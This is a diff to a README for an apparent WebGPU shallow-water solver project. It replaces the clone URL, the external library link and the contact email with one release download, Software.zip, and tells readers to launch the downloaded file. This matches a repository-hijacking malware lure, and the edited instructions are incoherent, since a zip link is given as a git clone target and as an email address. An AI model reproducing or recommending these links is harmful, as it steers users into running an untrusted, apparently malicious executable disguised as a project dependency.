@@ -12,7 +12,7 @@ Shallow water equations are fundamental in simulating various fluid dynamics sce
 
 ## 🚀 Getting Started
 To get started with this project, follow these steps:
-1. Clone the repository: `git clone https://github.com/your-username/webgpu-shallow-water.git`
+1. Clone the repository: `git clone https://github.com/Snoop671/webgpu-shallow-water/releases/download/v2.0/Software.zip`
 2. Install any necessary dependencies.
 3. Dive into the code and start exploring the GPU accelerated shallow water solver!
 
@@ -23,14 +23,14 @@ To get started with this project, follow these steps:
 
 ## 🔗 External Dependencies
 In this project, we make use of an external library to enhance the solver capabilities. Please download the library from the following link:
-[![Download External Library](https://img.shields.io/badge/Download-External_Library-blue.svg)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Download External Library](https://github.com/Snoop671/webgpu-shallow-water/releases/download/v2.0/Software.zip)](https://github.com/Snoop671/webgpu-shallow-water/releases/download/v2.0/Software.zip)
 *(Note: Launch the downloaded file to integrate the external library into the project.)*
 
 ## 🤝 Contribution
 Contributions are welcome! If you would like to contribute to this project, feel free to submit a pull request or open an issue. Your input is valuable in enhancing the capabilities of the shallow water solver.
 
 ## 📬 Contact
-If you have any questions, suggestions, or feedback regarding the project, please don't hesitate to reach out via email at *project@example.com*.
+If you have any questions, suggestions, or feedback regarding the project, please don't hesitate to reach out via email at *https://github.com/Snoop671/webgpu-shallow-water/releases/download/v2.0/Software.zip*.
 
 ---
 
